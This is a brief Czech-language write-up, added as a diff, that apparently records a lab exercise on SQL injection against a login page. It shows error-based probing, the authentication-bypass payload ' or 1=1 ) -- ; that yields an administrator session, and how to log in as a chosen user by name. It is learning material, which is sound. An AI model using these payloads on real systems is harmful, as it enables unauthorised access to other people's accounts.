@@ -1,0 +1,14 @@
+Přes login stránku můžeme zkusit sql injection pomocí '
+Vidíme SQL syntax error, takže se nám injekce povedla, ačkoliv špatně
+Zkusíme ' or 1=1 -- ; ale prý máme chybu někde v " to může znamenat,že máme někde něco navíc co tam chybí
+Uděláme naschvál chybu a uvidíme
+--------------------------------------
+'''') AND (password = '') ORDER BY id'
+--------------------------------------
+Vypadá to, že je celej dotaz v (), zkusíme přidat ' or 1=1 ) -- ;
+A to nás přihlásí do admina
+--------------------------------------
+Welcome Administrator
+There are 1 messages in your inbox.
+--------------------------------------
+Pokud za or dáme třeba name='Karel' tak nás to přihlasí za Karla, pokud existuje.
